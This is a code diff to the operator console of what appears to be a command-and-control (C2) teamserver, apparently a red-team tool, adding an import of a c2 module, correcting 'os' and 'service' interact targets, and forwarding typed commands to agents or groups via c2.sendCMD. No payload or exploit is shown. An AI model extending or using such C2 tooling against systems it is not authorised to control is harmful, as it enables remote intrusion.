@@ -1,4 +1,5 @@
 from teamserver import teamserver
+from server import c2
 
 from prompt_toolkit import prompt
 from prompt_toolkit.history import FileHistory
@@ -54,10 +55,10 @@ def mesaPrompt(): #TS is teamserver object
                     interactPrompt("agent", arr[2])
                 elif arr[1] == "os" or arr[1] == "o":
                     #TODO add check to list/dict that group exists, ts.getc2list
-                    interactPrompt("group", arr[2])
+                    interactPrompt("os", arr[2])
                 elif arr[1] == "service" or arr[1] == "s":
                     #TODO add check to list/dict that group exists, ts.getc2list
-                    interactPrompt("group", arr[2])
+                    interactPrompt("service", arr[2])
                 else:
                     print(colored("Incorrect arguments given.\n SYNTAX: interact <A[GENT]/G[ROUP]> <id>", 'yellow'))
             except:
@@ -219,6 +220,7 @@ def cmdPrompt(interactType, id):
         elif user_input == "back":
             return
         else:
+            c2.sendCMD(user_input, interactType, id)
             pass #TODO what about running exes/commands that hang?s
             #S: encode command
             #TR: create commandpacket with encoded command
@@ -236,4 +238,7 @@ def cmdPrompt(interactType, id):
 
     #setup DB?
     #setup beacon graphing
+
+
+    #TODO add shell?
 
